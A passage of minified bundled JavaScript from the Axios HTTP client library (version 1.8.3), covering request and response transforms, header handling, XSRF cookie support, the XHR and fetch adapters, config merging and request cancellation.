function g0e(r) {
    const e = {}
      , t = Object.keys(r);
    let o;
    const i = t.length;
    let n;
    for (o = 0; o < i; o++)
        n = t[o],
        e[n] = r[n];
    return e
}
function nU(r) {
    function e(t, o, i, n) {
        let s = t[n++];
        if (s === "__proto__")
            return !0;
        const a = Number.isFinite(+s)
          , l = n >= t.length;
        return s = !s && Oe.isArray(i) ? i.length : s,
        l ? (Oe.hasOwnProp(i, s) ? i[s] = [i[s], o] : i[s] = o,
        !a) : ((!i[s] || !Oe.isObject(i[s])) && (i[s] = []),
        e(t, o, i[s], n) && Oe.isArray(i[s]) && (i[s] = g0e(i[s])),
        !a)
    }
    if (Oe.isFormData(r) && Oe.isFunction(r.entries)) {
        const t = {};
        return Oe.forEachEntry(r, (o, i) => {
            e(p0e(o), i, t, 0)
        }
        ),
        t
    }
    return null
}
function y0e(r, e, t) {
    if (Oe.isString(r))
        try {
            return (e || JSON.parse)(r),
            Oe.trim(r)
        } catch (o) {
            if (o.name !== "SyntaxError")
                throw o
        }
    return (t || JSON.stringify)(r)
}
const D0 = {
    transitional: rU,
    adapter: ["xhr", "http", "fetch"],
    transformRequest: [function(e, t) {
        const o = t.getContentType() || ""
          , i = o.indexOf("application/json") > -1
          , n = Oe.isObject(e);
        if (n && Oe.isHTMLForm(e) && (e = new FormData(e)),
        Oe.isFormData(e))
            return i ? JSON.stringify(nU(e)) : e;
        if (Oe.isArrayBuffer(e) || Oe.isBuffer(e) || Oe.isStream(e) || Oe.isFile(e) || Oe.isBlob(e) || Oe.isReadableStream(e))
            return e;
        if (Oe.isArrayBufferView(e))
            return e.buffer;
        if (Oe.isURLSearchParams(e))
            return t.setContentType("application/x-www-form-urlencoded;charset=utf-8", !1),
            e.toString();
        let a;
        if (n) {
            if (o.indexOf("application/x-www-form-urlencoded") > -1)
                return h0e(e, this.formSerializer).toString();
            if ((a = Oe.isFileList(e)) || o.indexOf("multipart/form-data") > -1) {
                const l = this.env && this.env.FormData;
                return ax(a ? {
                    "files[]": e
                } : e, l && new l, this.formSerializer)
            }
        }
        return n || i ? (t.setContentType("application/json", !1),
        y0e(e)) : e
    }
    ],
    transformResponse: [function(e) {
        const t = this.transitional || D0.transitional
          , o = t && t.forcedJSONParsing
          , i = this.responseType === "json";
        if (Oe.isResponse(e) || Oe.isReadableStream(e))
            return e;
        if (e && Oe.isString(e) && (o && !this.responseType || i)) {
            const s = !(t && t.silentJSONParsing) && i;
            try {
                return JSON.parse(e)
            } catch (a) {
                if (s)
                    throw a.name === "SyntaxError" ? Ut.from(a, Ut.ERR_BAD_RESPONSE, this, null, this.response) : a
            }
        }
        return e
    }
    ],
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: {
        FormData: to.classes.FormData,
        Blob: to.classes.Blob
    },
    validateStatus: function(e) {
        return e >= 200 && e < 300
    },
    headers: {
        common: {
            Accept: "application/json, text/plain, */*",
            "Content-Type": void 0
        }
    }
};
Oe.forEach(["delete", "get", "head", "post", "put", "patch"], r => {
    D0.headers[r] = {}
}
);
const b0e = Oe.toObjectSet(["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"])
  , m0e = r => {
    const e = {};
    let t, o, i;
    return r && r.split(`
`).forEach(function(s) {
        i = s.indexOf(":"),
        t = s.substring(0, i).trim().toLowerCase(),
        o = s.substring(i + 1).trim(),
        !(!t || e[t] && b0e[t]) && (t === "set-cookie" ? e[t] ? e[t].push(o) : e[t] = [o] : e[t] = e[t] ? e[t] + ", " + o : o)
    }),
    e
}
  , s5 = Symbol("internals");
function Ep(r) {
    return r && String(r).trim().toLowerCase()
}
function Um(r) {
    return r === !1 || r == null ? r : Oe.isArray(r) ? r.map(Um) : String(r)
}
function x0e(r) {
    const e = Object.create(null)
      , t = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
    let o;
    for (; o = t.exec(r); )
        e[o[1]] = o[2];
    return e
}
const w0e = r => /^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(r.trim());
function Y2(r, e, t, o, i) {
    if (Oe.isFunction(o))
        return o.call(this, e, t);
    if (i && (e = t),
    !!Oe.isString(e)) {
        if (Oe.isString(o))
            return e.indexOf(o) !== -1;
        if (Oe.isRegExp(o))
            return o.test(e)
    }
}
function v0e(r) {
    return r.trim().toLowerCase().replace(/([a-z\d])(\w*)/g, (e, t, o) => t.toUpperCase() + o)
}
function T0e(r, e) {
    const t = Oe.toCamelCase(" " + e);
    ["get", "set", "has"].forEach(o => {
        Object.defineProperty(r, o + t, {
            value: function(i, n, s) {
                return this[o].call(this, e, i, n, s)
            },
            configurable: !0
        })
    }
    )
}
let Lo = class {
    constructor(e) {
        e && this.set(e)
    }
    set(e, t, o) {
        const i = this;
        function n(a, l, f) {
            const h = Ep(l);
            if (!h)
                throw new Error("header name must be a non-empty string");
            const p = Oe.findKey(i, h);
            (!p || i[p] === void 0 || f === !0 || f === void 0 && i[p] !== !1) && (i[p || l] = Um(a))
        }
        const s = (a, l) => Oe.forEach(a, (f, h) => n(f, h, l));
        if (Oe.isPlainObject(e) || e instanceof this.constructor)
            s(e, t);
        else if (Oe.isString(e) && (e = e.trim()) && !w0e(e))
            s(m0e(e), t);
        else if (Oe.isHeaders(e))
            for (const [a,l] of e.entries())
                n(l, a, o);
        else
            e != null && n(t, e, o);
        return this
    }
    get(e, t) {
        if (e = Ep(e),
        e) {
            const o = Oe.findKey(this, e);
            if (o) {
                const i = this[o];
                if (!t)
                    return i;
                if (t === !0)
                    return x0e(i);
                if (Oe.isFunction(t))
                    return t.call(this, i, o);
                if (Oe.isRegExp(t))
                    return t.exec(i);
                throw new TypeError("parser must be boolean|regexp|function")
            }
        }
    }
    has(e, t) {
        if (e = Ep(e),
        e) {
            const o = Oe.findKey(this, e);
            return !!(o && this[o] !== void 0 && (!t || Y2(this, this[o], o, t)))
        }
        return !1
    }
    delete(e, t) {
        const o = this;
        let i = !1;
        function n(s) {
            if (s = Ep(s),
            s) {
                const a = Oe.findKey(o, s);
                a && (!t || Y2(o, o[a], a, t)) && (delete o[a],
                i = !0)
            }
        }
        return Oe.isArray(e) ? e.forEach(n) : n(e),
        i
    }
    clear(e) {
        const t = Object.keys(this);
        let o = t.length
          , i = !1;
        for (; o--; ) {
            const n = t[o];
            (!e || Y2(this, this[n], n, e, !0)) && (delete this[n],
            i = !0)
        }
        return i
    }
    normalize(e) {
        const t = this
          , o = {};
        return Oe.forEach(this, (i, n) => {
            const s = Oe.findKey(o, n);
            if (s) {
                t[s] = Um(i),
                delete t[n];
                return
            }
            const a = e ? v0e(n) : String(n).trim();
            a !== n && delete t[n],
            t[a] = Um(i),
            o[a] = !0
        }
        ),
        this
    }
    concat(...e) {
        return this.constructor.concat(this, ...e)
    }
    toJSON(e) {
        const t = Object.create(null);
        return Oe.forEach(this, (o, i) => {
            o != null && o !== !1 && (t[i] = e && Oe.isArray(o) ? o.join(", ") : o)
        }
        ),
        t
    }
    [Symbol.iterator]() {
        return Object.entries(this.toJSON())[Symbol.iterator]()
    }
    toString() {
        return Object.entries(this.toJSON()).map( ([e,t]) => e + ": " + t).join(`
`)
    }
    get[Symbol.toStringTag]() {
        return "AxiosHeaders"
    }
    static from(e) {
        return e instanceof this ? e : new this(e)
    }
    static concat(e, ...t) {
        const o = new this(e);
        return t.forEach(i => o.set(i)),
        o
    }
    static accessor(e) {
        const o = (this[s5] = this[s5] = {
            accessors: {}
        }).accessors
          , i = this.prototype;
        function n(s) {
            const a = Ep(s);
            o[a] || (T0e(i, s),
            o[a] = !0)
        }
        return Oe.isArray(e) ? e.forEach(n) : n(e),
        this
    }
}
;
Lo.accessor(["Content-Type", "Content-Length", "Accept", "Accept-Encoding", "User-Agent", "Authorization"]);
Oe.reduceDescriptors(Lo.prototype, ({value: r}, e) => {
    let t = e[0].toUpperCase() + e.slice(1);
    return {
        get: () => r,
        set(o) {
            this[t] = o
        }
    }
}
);
Oe.freezeMethods(Lo);
function X2(r, e) {
    const t = this || D0
      , o = e || t
      , i = Lo.from(o.headers);
    let n = o.data;
    return Oe.forEach(r, function(a) {
        n = a.call(t, n, i.normalize(), e ? e.status : void 0)
    }),
    i.normalize(),
    n
}
function oU(r) {
    return !!(r && r.__CANCEL__)
}
function oh(r, e, t) {
    Ut.call(this, r ?? "canceled", Ut.ERR_CANCELED, e, t),
    this.name = "CanceledError"
}
Oe.inherits(oh, Ut, {
    __CANCEL__: !0
});
function iU(r, e, t) {
    const o = t.config.validateStatus;
    !t.status || !o || o(t.status) ? r(t) : e(new Ut("Request failed with status code " + t.status,[Ut.ERR_BAD_REQUEST, Ut.ERR_BAD_RESPONSE][Math.floor(t.status / 100) - 4],t.config,t.request,t))
}
function E0e(r) {
    const e = /^([-+\w]{1,25})(:?\/\/|:)/.exec(r);
    return e && e[1] || ""
}
function A0e(r, e) {
    r = r || 10;
    const t = new Array(r)
      , o = new Array(r);
    let i = 0, n = 0, s;
    return e = e !== void 0 ? e : 1e3,
    function(l) {
        const f = Date.now()
          , h = o[n];
        s || (s = f),
        t[i] = l,
        o[i] = f;
        let p = n
          , b = 0;
        for (; p !== i; )
            b += t[p++],
            p = p % r;
        if (i = (i + 1) % r,
        i === n && (n = (n + 1) % r),
        f - s < e)
            return;
        const v = h && f - h;
        return v ? Math.round(b * 1e3 / v) : void 0
    }
}
function P0e(r, e) {
    let t = 0, o = 1e3 / e, i, n;
    const s = (f, h=Date.now()) => {
        t = h,
        i = null,
        n && (clearTimeout(n),
        n = null),
        r.apply(null, f)
    }
    ;
    return [ (...f) => {
        const h = Date.now()
          , p = h - t;
        p >= o ? s(f, h) : (i = f,
        n || (n = setTimeout( () => {
            n = null,
            s(i)
        }
        , o - p)))
    }
    , () => i && s(i)]
}
const h1 = (r, e, t=3) => {
    let o = 0;
    const i = A0e(50, 250);
    return P0e(n => {
        const s = n.loaded
          , a = n.lengthComputable ? n.total : void 0
          , l = s - o
          , f = i(l)
          , h = s <= a;
        o = s;
        const p = {
            loaded: s,
            total: a,
            progress: a ? s / a : void 0,
            bytes: l,
            rate: f || void 0,
            estimated: f && a && h ? (a - s) / f : void 0,
            event: n,
            lengthComputable: a != null,
            [e ? "download" : "upload"]: !0
        };
        r(p)
    }
    , t)
}
  , a5 = (r, e) => {
    const t = r != null;
    return [o => e[0]({
        lengthComputable: t,
        total: r,
        loaded: o
    }), e[1]]
}
  , c5 = r => (...e) => Oe.asap( () => r(...e))
  , C0e = to.hasStandardBrowserEnv ? ( (r, e) => t => (t = new URL(t,to.origin),
r.protocol === t.protocol && r.host === t.host && (e || r.port === t.port)))(new URL(to.origin), to.navigator && /(msie|trident)/i.test(to.navigator.userAgent)) : () => !0
  , S0e = to.hasStandardBrowserEnv ? {
    write(r, e, t, o, i, n) {
        const s = [r + "=" + encodeURIComponent(e)];
        Oe.isNumber(t) && s.push("expires=" + new Date(t).toGMTString()),
        Oe.isString(o) && s.push("path=" + o),
        Oe.isString(i) && s.push("domain=" + i),
        n === !0 && s.push("secure"),
        document.cookie = s.join("; ")
    },
    read(r) {
        const e = document.cookie.match(new RegExp("(^|;\\s*)(" + r + ")=([^;]*)"));
        return e ? decodeURIComponent(e[3]) : null
    },
    remove(r) {
        this.write(r, "", Date.now() - 864e5)
    }
} : {
    write() {},
    read() {
        return null
    },
    remove() {}
};
function B0e(r) {
    return /^([a-z][a-z\d+\-.]*:)?\/\//i.test(r)
}
function _0e(r, e) {
    return e ? r.replace(/\/?\/$/, "") + "/" + e.replace(/^\/+/, "") : r
}
function sU(r, e, t) {
    let o = !B0e(e);
    return r && o || t == !1 ? _0e(r, e) : e
}
const l5 = r => r instanceof Lo ? {
    ...r
} : r;
function bu(r, e) {
    e = e || {};
    const t = {};
    function o(f, h, p, b) {
        return Oe.isPlainObject(f) && Oe.isPlainObject(h) ? Oe.merge.call({
            caseless: b
        }, f, h) : Oe.isPlainObject(h) ? Oe.merge({}, h) : Oe.isArray(h) ? h.slice() : h
    }
    function i(f, h, p, b) {
        if (Oe.isUndefined(h)) {
            if (!Oe.isUndefined(f))
                return o(void 0, f, p, b)
        } else
            return o(f, h, p, b)
    }
    function n(f, h) {
        if (!Oe.isUndefined(h))
            return o(void 0, h)
    }
    function s(f, h) {
        if (Oe.isUndefined(h)) {
            if (!Oe.isUndefined(f))
                return o(void 0, f)
        } else
            return o(void 0, h)
    }
    function a(f, h, p) {
        if (p in e)
            return o(f, h);
        if (p in r)
            return o(void 0, f)
    }
    const l = {
        url: n,
        method: n,
        data: n,
        baseURL: s,
        transformRequest: s,
        transformResponse: s,
        paramsSerializer: s,
        timeout: s,
        timeoutMessage: s,
        withCredentials: s,
        withXSRFToken: s,
        adapter: s,
        responseType: s,
        xsrfCookieName: s,
        xsrfHeaderName: s,
        onUploadProgress: s,
        onDownloadProgress: s,
        decompress: s,
        maxContentLength: s,
        maxBodyLength: s,
        beforeRedirect: s,
        transport: s,
        httpAgent: s,
        httpsAgent: s,
        cancelToken: s,
        socketPath: s,
        responseEncoding: s,
        validateStatus: a,
        headers: (f, h, p) => i(l5(f), l5(h), p, !0)
    };
    return Oe.forEach(Object.keys(Object.assign({}, r, e)), function(h) {
        const p = l[h] || i
          , b = p(r[h], e[h], h);
        Oe.isUndefined(b) && p !== a || (t[h] = b)
    }),
    t
}
const aU = r => {
    const e = bu({}, r);
    let {data: t, withXSRFToken: o, xsrfHeaderName: i, xsrfCookieName: n, headers: s, auth: a} = e;
    e.headers = s = Lo.from(s),
    e.url = tU(sU(e.baseURL, e.url, e.allowAbsoluteUrls), r.params, r.paramsSerializer),
    a && s.set("Authorization", "Basic " + btoa((a.username || "") + ":" + (a.password ? unescape(encodeURIComponent(a.password)) : "")));
    let l;
    if (Oe.isFormData(t)) {
        if (to.hasStandardBrowserEnv || to.hasStandardBrowserWebWorkerEnv)
            s.setContentType(void 0);
        else if ((l = s.getContentType()) !== !1) {
            const [f,...h] = l ? l.split(";").map(p => p.trim()).filter(Boolean) : [];
            s.setContentType([f || "multipart/form-data", ...h].join("; "))
        }
    }
    if (to.hasStandardBrowserEnv && (o && Oe.isFunction(o) && (o = o(e)),
    o || o !== !1 && C0e(e.url))) {
        const f = i && n && S0e.read(n);
        f && s.set(i, f)
    }
    return e
}
  , I0e = typeof XMLHttpRequest < "u"
  , O0e = I0e && function(r) {
    return new Promise(function(t, o) {
        const i = aU(r);
        let n = i.data;
        const s = Lo.from(i.headers).normalize();
        let {responseType: a, onUploadProgress: l, onDownloadProgress: f} = i, h, p, b, v, T;
        function x() {
            v && v(),
            T && T(),
            i.cancelToken && i.cancelToken.unsubscribe(h),
            i.signal && i.signal.removeEventListener("abort", h)
        }
        let E = new XMLHttpRequest;
        E.open(i.method.toUpperCase(), i.url, !0),
        E.timeout = i.timeout;
        function B() {
            if (!E)
                return;
            const O = Lo.from("getAllResponseHeaders"in E && E.getAllResponseHeaders())
              , D = {
                data: !a || a === "text" || a === "json" ? E.responseText : E.response,
                status: E.status,
                statusText: E.statusText,
                headers: O,
                config: r,
                request: E
            };
            iU(function(M) {
                t(M),
                x()
            }, function(M) {
                o(M),
                x()
            }, D),
            E = null
        }
        "onloadend"in E ? E.onloadend = B : E.onreadystatechange = function() {
            !E || E.readyState !== 4 || E.status === 0 && !(E.responseURL && E.responseURL.indexOf("file:") === 0) || setTimeout(B)
        }
        ,
        E.onabort = function() {
            E && (o(new Ut("Request aborted",Ut.ECONNABORTED,r,E)),
            E = null)
        }
        ,
        E.onerror = function() {
            o(new Ut("Network Error",Ut.ERR_NETWORK,r,E)),
            E = null
        }
        ,
        E.ontimeout = function() {
            let F = i.timeout ? "timeout of " + i.timeout + "ms exceeded" : "timeout exceeded";
            const D = i.transitional || rU;
            i.timeoutErrorMessage && (F = i.timeoutErrorMessage),
            o(new Ut(F,D.clarifyTimeoutError ? Ut.ETIMEDOUT : Ut.ECONNABORTED,r,E)),
            E = null
        }
        ,
        n === void 0 && s.setContentType(null),
        "setRequestHeader"in E && Oe.forEach(s.toJSON(), function(F, D) {
            E.setRequestHeader(D, F)
        }),
        Oe.isUndefined(i.withCredentials) || (E.withCredentials = !!i.withCredentials),
        a && a !== "json" && (E.responseType = i.responseType),
        f && ([b,T] = h1(f, !0),
        E.addEventListener("progress", b)),
        l && E.upload && ([p,v] = h1(l),
        E.upload.addEventListener("progress", p),
        E.upload.addEventListener("loadend", v)),
        (i.cancelToken || i.signal) && (h = O => {
            E && (o(!O || O.type ? new oh(null,r,E) : O),
            E.abort(),
            E = null)
        }
        ,
        i.cancelToken && i.cancelToken.subscribe(h),
        i.signal && (i.signal.aborted ? h() : i.signal.addEventListener("abort", h)));
        const P = E0e(i.url);
        if (P && to.protocols.indexOf(P) === -1) {
            o(new Ut("Unsupported protocol " + P + ":",Ut.ERR_BAD_REQUEST,r));
            return
        }
        E.send(n || null)
    }
    )
}
  , R0e = (r, e) => {
    const {length: t} = r = r ? r.filter(Boolean) : [];
    if (e || t) {
        let o = new AbortController, i;
        const n = function(f) {
            if (!i) {
                i = !0,
                a();
                const h = f instanceof Error ? f : this.reason;
                o.abort(h instanceof Ut ? h : new oh(h instanceof Error ? h.message : h))
            }
        };
        let s = e && setTimeout( () => {
            s = null,
            n(new Ut(`timeout ${e} of ms exceeded`,Ut.ETIMEDOUT))
        }
        , e);
        const a = () => {
            r && (s && clearTimeout(s),
            s = null,
            r.forEach(f => {
                f.unsubscribe ? f.unsubscribe(n) : f.removeEventListener("abort", n)
            }
            ),
            r = null)
        }
        ;
        r.forEach(f => f.addEventListener("abort", n));
        const {signal: l} = o;
        return l.unsubscribe = () => Oe.asap(a),
        l
    }
}
  , W0e = function*(r, e) {
    let t = r.byteLength;
    if (t < e) {
        yield r;
        return
    }
    let o = 0, i;
    for (; o < t; )
        i = o + e,
        yield r.slice(o, i),
        o = i
}
  , M0e = async function*(r, e) {
    for await(const t of N0e(r))
        yield*W0e(t, e)
}
  , N0e = async function*(r) {
    if (r[Symbol.asyncIterator]) {
        yield*r;
        return
    }
    const e = r.getReader();
    try {
        for (; ; ) {
            const {done: t, value: o} = await e.read();
            if (t)
                break;
            yield o
        }
    } finally {
        await e.cancel()
    }
}
  , u5 = (r, e, t, o) => {
    const i = M0e(r, e);
    let n = 0, s, a = l => {
        s || (s = !0,
        o && o(l))
    }
    ;
    return new ReadableStream({
        async pull(l) {
            try {
                const {done: f, value: h} = await i.next();
                if (f) {
                    a(),
                    l.close();
                    return
                }
                let p = h.byteLength;
                if (t) {
                    let b = n += p;
                    t(b)
                }
                l.enqueue(new Uint8Array(h))
            } catch (f) {
                throw a(f),
                f
            }
        },
        cancel(l) {
            return a(l),
            i.return()
        }
    },{
        highWaterMark: 2
    })
}
  , cx = typeof fetch == "function" && typeof Request == "function" && typeof Response == "function"
  , cU = cx && typeof ReadableStream == "function"
  , D0e = cx && (typeof TextEncoder == "function" ? (r => e => r.encode(e))(new TextEncoder) : async r => new Uint8Array(await new Response(r).arrayBuffer()))
  , lU = (r, ...e) => {
    try {
        return !!r(...e)
    } catch {
        return !1
    }
}
  , F0e = cU && lU( () => {
    let r = !1;
    const e = new Request(to.origin,{
        body: new ReadableStream,
        method: "POST",
        get duplex() {
            return r = !0,
            "half"
        }
    }).headers.has("Content-Type");
    return r && !e
}
)
  , f5 = 64 * 1024
  , NA = cU && lU( () => Oe.isReadableStream(new Response("").body))
  , p1 = {
    stream: NA && (r => r.body)
};
cx && (r => {
    ["text", "arrayBuffer", "blob", "formData", "stream"].forEach(e => {
        !p1[e] && (p1[e] = Oe.isFunction(r[e]) ? t => t[e]() : (t, o) => {
            throw new Ut(`Response type '${e}' is not supported`,Ut.ERR_NOT_SUPPORT,o)
        }
        )
    }
    )
}
)(new Response);
const U0e = async r => {
    if (r == null)
        return 0;
    if (Oe.isBlob(r))
        return r.size;
    if (Oe.isSpecCompliantForm(r))
        return (await new Request(to.origin,{
            method: "POST",
            body: r
        }).arrayBuffer()).byteLength;
    if (Oe.isArrayBufferView(r) || Oe.isArrayBuffer(r))
        return r.byteLength;
    if (Oe.isURLSearchParams(r) && (r = r + ""),
    Oe.isString(r))
        return (await D0e(r)).byteLength
}
  , k0e = async (r, e) => {
    const t = Oe.toFiniteNumber(r.getContentLength());
    return t ?? U0e(e)
}
  , L0e = cx && (async r => {
    let {url: e, method: t, data: o, signal: i, cancelToken: n, timeout: s, onDownloadProgress: a, onUploadProgress: l, responseType: f, headers: h, withCredentials: p="same-origin", fetchOptions: b} = aU(r);
    f = f ? (f + "").toLowerCase() : "text";
    let v = R0e([i, n && n.toAbortSignal()], s), T;
    const x = v && v.unsubscribe && ( () => {
        v.unsubscribe()
    }
    );
    let E;
    try {
        if (l && F0e && t !== "get" && t !== "head" && (E = await k0e(h, o)) !== 0) {
            let D = new Request(e,{
                method: "POST",
                body: o,
                duplex: "half"
            }), I;
            if (Oe.isFormData(o) && (I = D.headers.get("content-type")) && h.setContentType(I),
            D.body) {
                const [M,C] = a5(E, h1(c5(l)));
                o = u5(D.body, f5, M, C)
            }
        }
        Oe.isString(p) || (p = p ? "include" : "omit");
        const B = "credentials"in Request.prototype;
        T = new Request(e,{
            ...b,
            signal: v,
            method: t.toUpperCase(),
            headers: h.normalize().toJSON(),
            body: o,
            duplex: "half",
            credentials: B ? p : void 0
        });
        let P = await fetch(T);
        const O = NA && (f === "stream" || f === "response");
        if (NA && (a || O && x)) {
            const D = {};
            ["status", "statusText", "headers"].forEach(W => {
                D[W] = P[W]
            }
            );
            const I = Oe.toFiniteNumber(P.headers.get("content-length"))
              , [M,C] = a && a5(I, h1(c5(a), !0)) || [];
            P = new Response(u5(P.body, f5, M, () => {
                C && C(),
                x && x()
            }
            ),D)
        }
        f = f || "text";
        let F = await p1[Oe.findKey(p1, f) || "text"](P, r);
        return !O && x && x(),
        await new Promise( (D, I) => {
            iU(D, I, {
                data: F,
                headers: Lo.from(P.headers),
                status: P.status,
                statusText: P.statusText,
                config: r,
                request: T
            })
        }
        )
    } catch (B) {
        throw x && x(),
        B && B.name === "TypeError" && /fetch/i.test(B.message) ? Object.assign(new Ut("Network Error",Ut.ERR_NETWORK,r,T), {
            cause: B.cause || B
        }) : Ut.from(B, B && B.code, r, T)
    }
}
)
  , DA = {
    http: t0e,
    xhr: O0e,
    fetch: L0e
};
Oe.forEach(DA, (r, e) => {
    if (r) {
        try {
            Object.defineProperty(r, "name", {
                value: e
            })
        } catch {}
        Object.defineProperty(r, "adapterName", {
            value: e
        })
    }
}
);
const d5 = r => `- ${r}`
  , $0e = r => Oe.isFunction(r) || r === null || r === !1
  , uU = {
    getAdapter: r => {
        r = Oe.isArray(r) ? r : [r];
        const {length: e} = r;
        let t, o;
        const i = {};
        for (let n = 0; n < e; n++) {
            t = r[n];
            let s;
            if (o = t,
            !$0e(t) && (o = DA[(s = String(t)).toLowerCase()],
            o === void 0))
                throw new Ut(`Unknown adapter '${s}'`);
            if (o)
                break;
            i[s || "#" + n] = o
        }
        if (!o) {
            const n = Object.entries(i).map( ([a,l]) => `adapter ${a} ` + (l === !1 ? "is not supported by the environment" : "is not available in the build"));
            let s = e ? n.length > 1 ? `since :
` + n.map(d5).join(`
`) : " " + d5(n[0]) : "as no adapter specified";
            throw new Ut("There is no suitable adapter to dispatch the request " + s,"ERR_NOT_SUPPORT")
        }
        return o
    }
    ,
    adapters: DA
};
function J2(r) {
    if (r.cancelToken && r.cancelToken.throwIfRequested(),
    r.signal && r.signal.aborted)
        throw new oh(null,r)
}
function h5(r) {
    return J2(r),
    r.headers = Lo.from(r.headers),
    r.data = X2.call(r, r.transformRequest),
    ["post", "put", "patch"].indexOf(r.method) !== -1 && r.headers.setContentType("application/x-www-form-urlencoded", !1),
    uU.getAdapter(r.adapter || D0.adapter)(r).then(function(o) {
        return J2(r),
        o.data = X2.call(r, r.transformResponse, o),
        o.headers = Lo.from(o.headers),
        o
    }, function(o) {
        return oU(o) || (J2(r),
        o && o.response && (o.response.data = X2.call(r, r.transformResponse, o.response),
        o.response.headers = Lo.from(o.response.headers))),
        Promise.reject(o)
    })
}
const fU = "1.8.3"
  , lx = {};
["object", "boolean", "number", "function", "string", "symbol"].forEach( (r, e) => {
    lx[r] = function(o) {
        return typeof o === r || "a" + (e < 1 ? "n " : " ") + r
    }
}
);
const p5 = {};
lx.transitional = function(e, t, o) {
    function i(n, s) {
        return "[Axios v" + fU + "] Transitional option '" + n + "'" + s + (o ? ". " + o : "")
    }
    return (n, s, a) => {
        if (e === !1)
            throw new Ut(i(s, " has been removed" + (t ? " in " + t : "")),Ut.ERR_DEPRECATED);
        return t && !p5[s] && (p5[s] = !0,
        console.warn(i(s, " has been deprecated since v" + t + " and will be removed in the near future"))),
        e ? e(n, s, a) : !0
    }
}
;
lx.spelling = function(e) {
    return (t, o) => (console.warn(`${o} is likely a misspelling of ${e}`),
    !0)
}
;
function z0e(r, e, t) {
    if (typeof r != "object")
        throw new Ut("options must be an object",Ut.ERR_BAD_OPTION_VALUE);
    const o = Object.keys(r);
    let i = o.length;
    for (; i-- > 0; ) {
        const n = o[i]
          , s = e[n];
        if (s) {
            const a = r[n]
              , l = a === void 0 || s(a, n, r);
            if (l !== !0)
                throw new Ut("option " + n + " must be " + l,Ut.ERR_BAD_OPTION_VALUE);
            continue
        }
        if (t !== !0)
            throw new Ut("Unknown option " + n,Ut.ERR_BAD_OPTION)
    }
}
const km = {
    assertOptions: z0e,
    validators: lx
}
  , Os = km.validators;
let iu = class {
    constructor(e) {
        this.defaults = e,
        this.interceptors = {
            request: new i5,
            response: new i5
        }
    }
    async request(e, t) {
        try {
            return await this._request(e, t)
        } catch (o) {
            if (o instanceof Error) {
                let i = {};
                Error.captureStackTrace ? Error.captureStackTrace(i) : i = new Error;
                const n = i.stack ? i.stack.replace(/^.+\n/, "") : "";
                try {
                    o.stack ? n && !String(o.stack).endsWith(n.replace(/^.+\n.+\n/, "")) && (o.stack += `
` + n) : o.stack = n
                } catch {}
            }
            throw o
        }
    }
    _request(e, t) {
        typeof e == "string" ? (t = t || {},
        t.url = e) : t = e || {},
        t = bu(this.defaults, t);
        const {transitional: o, paramsSerializer: i, headers: n} = t;
        o !== void 0 && km.assertOptions(o, {
            silentJSONParsing: Os.transitional(Os.boolean),
            forcedJSONParsing: Os.transitional(Os.boolean),
            clarifyTimeoutError: Os.transitional(Os.boolean)
        }, !1),
        i != null && (Oe.isFunction(i) ? t.paramsSerializer = {
            serialize: i
        } : km.assertOptions(i, {
            encode: Os.function,
            serialize: Os.function
        }, !0)),
        t.allowAbsoluteUrls !== void 0 || (this.defaults.allowAbsoluteUrls !== void 0 ? t.allowAbsoluteUrls = this.defaults.allowAbsoluteUrls : t.allowAbsoluteUrls = !0),
        km.assertOptions(t, {
            baseUrl: Os.spelling("baseURL"),
            withXsrfToken: Os.spelling("withXSRFToken")
        }, !0),
        t.method = (t.method || this.defaults.method || "get").toLowerCase();
        let s = n && Oe.merge(n.common, n[t.method]);
        n && Oe.forEach(["delete", "get", "head", "post", "put", "patch", "common"], T => {
            delete n[T]
        }
        ),
        t.headers = Lo.concat(s, n);
        const a = [];
        let l = !0;
        this.interceptors.request.forEach(function(x) {
            typeof x.runWhen == "function" && x.runWhen(t) === !1 || (l = l && x.synchronous,
            a.unshift(x.fulfilled, x.rejected))
        });
        const f = [];
        this.interceptors.response.forEach(function(x) {
            f.push(x.fulfilled, x.rejected)
        });
        let h, p = 0, b;
        if (!l) {
            const T = [h5.bind(this), void 0];
            for (T.unshift.apply(T, a),
            T.push.apply(T, f),
            b = T.length,
            h = Promise.resolve(t); p < b; )
                h = h.then(T[p++], T[p++]);
            return h
        }
        b = a.length;
        let v = t;
        for (p = 0; p < b; ) {
            const T = a[p++]
              , x = a[p++];
            try {
                v = T(v)
            } catch (E) {
                x.call(this, E);
                break
            }
        }
        try {
            h = h5.call(this, v)
        } catch (T) {
            return Promise.reject(T)
        }
        for (p = 0,
        b = f.length; p < b; )
            h = h.then(f[p++], f[p++]);
        return h
    }
    getUri(e) {
        e = bu(this.defaults, e);
        const t = sU(e.baseURL, e.url, e.allowAbsoluteUrls);
        return tU(t, e.params, e.paramsSerializer)
    }
}
;
Oe.forEach(["delete", "get", "head", "options"], function(e) {
    iu.prototype[e] = function(t, o) {
        return this.request(bu(o || {}, {
            method: e,
            url: t,
            data: (o || {}).data
        }))
    }
});
Oe.forEach(["post", "put", "patch"], function(e) {
    function t(o) {
        return function(n, s, a) {
            return this.request(bu(a || {}, {
                method: e,
                headers: o ? {
                    "Content-Type": "multipart/form-data"
                } : {},
                url: n,
                data: s
            }))
        }
    }
    iu.prototype[e] = t(),
    iu.prototype[e + "Form"] = t(!0)
});
let j0e = class dU {
    constructor(e) {
        if (typeof e != "function")
            throw new TypeError("executor must be a function.");
        let t;
        this.promise = new Promise(function(n) {
            t = n
        }
        );
        const o = this;
        this.promise.then(i => {
            if (!o._listeners)
                return;
            let n = o._listeners.length;
            for (; n-- > 0; )
                o._listeners[n](i);
            o._listeners = null
        }
        ),
        this.promise.then = i => {
            let n;
            const s = new Promise(a => {
                o.subscribe(a),
                n = a
            }
            ).then(i);
            return s.cancel = function() {
                o.unsubscribe(n)
            }
            ,
            s
        }
        ,
        e(function(n, s, a) {
            o.reason || (o.reason = new oh(n,s,a),
            t(o.reason))
        })
    }
    throwIfRequested() {
        if (this.reason)
            throw this.reason
    }
    subscribe(e) {
        if (this.reason) {
            e(this.reason);
            return
        }
        this._listeners ? this._listeners.push(e) : this._listeners = [e]
    }
    unsubscribe(e) {
        if (!this._listeners)
            return;
